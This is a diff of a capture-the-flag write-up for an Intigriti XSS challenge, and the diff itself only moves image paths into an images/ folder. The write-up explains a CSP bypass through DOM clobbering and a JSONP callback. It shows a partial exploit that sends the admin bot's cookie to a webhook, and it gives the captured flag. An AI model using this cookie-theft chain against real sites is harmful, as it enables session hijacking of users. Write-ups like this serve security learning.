@@ -3,27 +3,27 @@
 Hi! This is writeup for the Intigriti's March 0326 challenge. The goal was to find an XSS vulnerability on the challenge page, use it to steal the admin bot's cookie, and capture the flag. Here's how I did it.
 
 
-![](challenge-description.png)
+![](images/challenge-description.png)
 
 The rules stated the solution must leverage an XSS vulnerability, must not be self-XSS, must work in the latest version of Google Chrome, and must require no more than one click from the victim. The target was an admin bot that would visit any URL submitted through a report form — meaning cookie theft via XSS was the objective.
 
 **First phase recon**
 
-![](challenge-page.png)
+![](images/challenge-page.png)
 
 The challenge page was a themed "Secure Search Portal" with a search field, a results container, and a "Report it to Admin" link that opened a modal for submitting URLs to the admin bot. The page loaded three JavaScript files: *purify.min.js*, *components.js*, and *main.js*. The URL accepted two parameters: *q* (search query) and *domain* (set to *internal* by a hidden form field).
 
 **Testing the Search Field**
 
-![](testing-the-search-field.png)
+![](images/testing-the-search-field.png)
 
 The *q* parameter was the obvious injection point — its value appeared reflected in the search results. Basic XSS payloads like `<script>alert(1)</script>` and `<img onerror=alert(1) src=x>` were immediately blocked. Checking the response headers confirmed a strict Content Security Policy: `script-src 'self'` blocked all inline scripts and event handlers. This ruled out classic XSS approaches entirely.
 
 **Analysing the JavaScript Files**
 
-![](purify-min-js-file.png)
-![](components-js-file.png) 
-![](main-js-file.png)
+![](images/purify-min-js-file.png)
+![](images/components-js-file.png) 
+![](images/main-js-file.png)
 
 Reading the source files revealed the full picture:
 
@@ -71,7 +71,7 @@ The key insight: `window.authConfig` could be **DOM-clobbered** using a `<form n
 
 **The Report Functionality**
 
-![](reporting-to-admin-bot-functionality.png)
+![](images/reporting-to-admin-bot-functionality.png)
 
 The "Report it to Admin" modal submitted a URL via `POST /report`. Testing confirmed the server sent the URL to a headless browser (admin bot) which visited it with its session cookie. This was the delivery mechanism — any URL we crafted would be visited by the bot, triggering our payload.
 
@@ -90,7 +90,7 @@ GET /api/stats?callback=Auth.loginRedirect
 
 This was a same-origin response that passed the `script-src 'self'` CSP and, when loaded as a script, called `Auth.loginRedirect()` directly.
 
-![](network-stats-script-injection.png)
+![](images/network-stats-script-injection.png)
 
 **Building the Exploit Chain**
 
@@ -118,19 +118,18 @@ const q = `<form name="authConfig" data-next="${wh}" data-append="true"></form><
 const url = `https://challenge-0326.intigriti.io/challenge.html?domain=internal&q=${encodeURIComponent(q)}`;
 console.log(url);
 ```
-![](webhook-own-cookie-control-test.png)
+![](images/webhook-own-cookie-control-test.png)
 
 **Capturing the Flag**
 
 The encoded payload URL was submitted to the admin bot via the report form. The bot visited the URL, the exploit fired automatically on page load with zero clicks required, and the webhook received:
 
-![](payload.png)
+![](images/payload.png)
 
-![](flag.png)
+![](images/flag.png)
 
 ```
 GET /?token=INTIGRITI{019cdb71-fcd4-77cc-b15f-d8a3b6d63947}
 ```
 
 **Flag:**:*INTIGRITI{019cdb71-fcd4-77cc-b15f-d8a3b6d63947}*
-
